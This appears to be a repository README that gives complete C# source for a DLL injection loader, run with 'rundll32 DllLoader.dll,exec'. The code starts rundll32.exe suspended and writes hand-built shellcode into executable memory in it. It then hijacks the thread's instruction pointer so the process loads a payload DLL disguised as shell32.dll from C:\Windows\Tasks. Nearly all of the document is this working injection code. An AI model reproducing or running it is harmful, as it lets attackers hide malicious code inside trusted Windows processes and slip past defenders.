# DLLloaderCS
Load 32bit .DLL payload from C# (experimental) only works when compiled to 32bit, payload must be 32bit also (unmanaged code)
This startes rundll32 in suspended mode and inject .DLL payload shell32.dll 

Execution: rundll32 DllLoader.dll,exec

DllLoader.cs:

```
using System;
using System.Security;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.ConstrainedExecution;
using System.Management;
using System.Security.Principal;
using System.Collections.Generic;
using System.ComponentModel;
using System.Security.Permissions;
using Microsoft.Win32.SafeHandles;
using System.Linq;
using System.Reflection;
using System.Security.AccessControl;
using System.Text;
using System.Threading;


public class Code
{

      public struct STARTUPINFO
      {
          public int cb;
          public string lpReserved;
          public string lpDesktop;
          public string lpTitle;
          public int dwX;
          public int dwY;
          public int dwXSize;
          public int dwYSize;
          public int dwXCountChars;
          public int dwYCountChars;
          public int dwFillAttribute;
          public int dwFlags;
          public short wShowWindow;
          public short cbReserved2;
          public int lpReserved2;
          public IntPtr hStdInput;
          public IntPtr hStdOutput;
          public IntPtr hStdError;
      }

      public struct PROCESS_INFORMATION
      {
          public IntPtr hProcess;
          public IntPtr hThread;
          public int dwProcessId;
          public int dwThreadId;
      }

      [StructLayout(LayoutKind.Sequential)]
      public struct FLOATING_SAVE_AREA
      {
      public uint ControlWord;
      public uint StatusWord;
      public uint TagWord;
      public uint ErrorOffset;
      public uint ErrorSelector;
      public uint DataOffset;
      public uint DataSelector;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
      public byte[] RegisterArea;
      public uint Cr0NpxState;
      }

      public enum PAGE_EXECUTE_ENUM
      {
          PAGE_EXECUTE_READ = 0x20,
          PAGE_EXECUTE_READWRITE = 0x40
      }

      [StructLayout(LayoutKind.Sequential)]
      public struct CONTEXT
      {
           public uint ContextFlags; //set this to an appropriate value
           // Retrieved by CONTEXT_DEBUG_REGISTERS
           public uint Dr0;
           public uint Dr1;
           public uint Dr2;
           public uint Dr3;
           public uint Dr6;
           public uint Dr7;
           // Retrieved by CONTEXT_FLOATING_POINT
           public FLOATING_SAVE_AREA FloatSave;
           // Retrieved by CONTEXT_SEGMENTS
           public uint SegGs;
           public uint SegFs;
           public uint SegEs;
           public uint SegDs;
           // Retrieved by CONTEXT_INTEGER
           public uint Edi;
           public uint Esi;
           public uint Ebx;
           public uint Edx;
           public uint Ecx;
           public uint Eax;
           // Retrieved by CONTEXT_CONTROL
           public uint Ebp;
           public uint Eip;
           public uint SegCs;
           public uint EFlags;
           public uint Esp;
           public uint SegSs;
           // Retrieved by CONTEXT_EXTENDED_REGISTERS
           [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
           public byte[] ExtendedRegisters;
      }

      public const int CREATE_SUSPENDED = 0x00000004;
      public const UInt32 MEM_COMMIT = 0x00001000;
      public const UInt32 CONTEXT_i386 = 0x00010000;
      public const UInt32 CONTEXT_CONTROL = CONTEXT_i386 | 0x00000001;

      [DllImport("kernel32")]
      public static extern IntPtr LoadLibrary(string lpLibFileName);

      [DllImport("kernel32")]
      public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

      [DllImport("kernel32", EntryPoint = "VirtualAllocEx")]
      public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, PAGE_EXECUTE_ENUM flProtect);

      [DllImport("kernel32", EntryPoint = "GetThreadContext")]
      public static extern int GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

      [DllImport("kernel32")]
      public static extern Int32 WriteProcessMemory(IntPtr hProcess, IntPtr lpBassAddress, byte[] lpBuffer, Int32 nSize, IntPtr lpNumberOfBytesRead);

      [DllImport("ntdll.dll")]
      private static extern bool NtWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, ulong dwSize, out IntPtr lpNumberOfBytesWritten);

      [DllImport("kernel32", EntryPoint = "SetThreadContext")]
      public static extern int SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

      [DllImport("kernel32", EntryPoint = "ResumeThread")]
      public static extern int ResumeThread(IntPtr hThread);

      [DllImport("kernel32", EntryPoint = "CreateProcess")]
      public static extern int CreateProcess( string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, String lpCurrentDriectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

    public static void exec()
    {
        string PayloadPath = "C:\\Windows\\System32\\rundll32.exe";
        string Payload = "C:\\Windows\\Tasks\\shell32.dll";
        byte [] sc = new byte [32] { 96, 156, 104, 0, 0, 0, 0, 232, 0, 0, 0, 0, 157, 97, 233, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
        IntPtr hProcess = IntPtr.Zero;
        IntPtr hThread = IntPtr.Zero;
        IntPtr hModule = IntPtr.Zero;
        IntPtr LoadLibraryAddress = IntPtr.Zero;
        hModule = LoadLibrary("Kernel32.dll");
        LoadLibraryAddress = GetProcAddress(hModule, "LoadLibraryA");
        CONTEXT context = new CONTEXT();
        Byte[] Payloadbin = Encoding.Default.GetBytes(Payload);
        STARTUPINFO StartupInfo = new STARTUPINFO();
        PROCESS_INFORMATION ProcessInformation = new PROCESS_INFORMATION();
        int result = CreateProcess( null, PayloadPath, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, System.IO.Path.GetDirectoryName(PayloadPath), ref StartupInfo, ref ProcessInformation);
        hProcess = ProcessInformation.hProcess;
        hThread = ProcessInformation.hThread;
        context.ContextFlags = CONTEXT_CONTROL;
        GetThreadContext(hThread, ref context);
        Int32 dwSize = 1024;
        IntPtr AllocMemory = VirtualAllocEx(hProcess, IntPtr.Zero, dwSize, MEM_COMMIT, PAGE_EXECUTE_ENUM.PAGE_EXECUTE_READWRITE);
        IntPtr data1 = IntPtr.Add(AllocMemory, 256);
        Byte[] tmp = BitConverter.GetBytes(data1.ToInt32());
        Int32 Idx = 3;
        Array.Copy(tmp, 0, sc, Idx, 4);
        Int32 data2 = (Int32)LoadLibraryAddress - (AllocMemory.ToInt32() + 12);
        tmp = BitConverter.GetBytes(data2);
        Idx = 8;
        Array.Copy(tmp, 0, sc, Idx, 4);
        data2 = (int)context.Eip - (AllocMemory.ToInt32() + 19);
        tmp = BitConverter.GetBytes(data2);
        Idx = 15;
        Array.Copy(tmp, 0, sc, Idx, 4);
        //WriteProcessMemory(hProcess, AllocMemory, sc, sc.Length, IntPtr.Zero);   <-- this works too
        IntPtr bytesWritten;
        NtWriteVirtualMemory(hProcess, AllocMemory, sc, (ulong)sc.Length, out bytesWritten);
        //WriteProcessMemory(hProcess, IntPtr.Add(AllocMemory, 256), Payloadbin, Payloadbin.Length, IntPtr.Zero);  <-- this works too
        NtWriteVirtualMemory(hProcess, IntPtr.Add(AllocMemory, 256), Payloadbin, (ulong)Payloadbin.Length, out bytesWritten);
        context.Eip = (UInt32)AllocMemory;
        SetThreadContext(hThread, ref context);
        ResumeThread(hThread);
  }
}


```
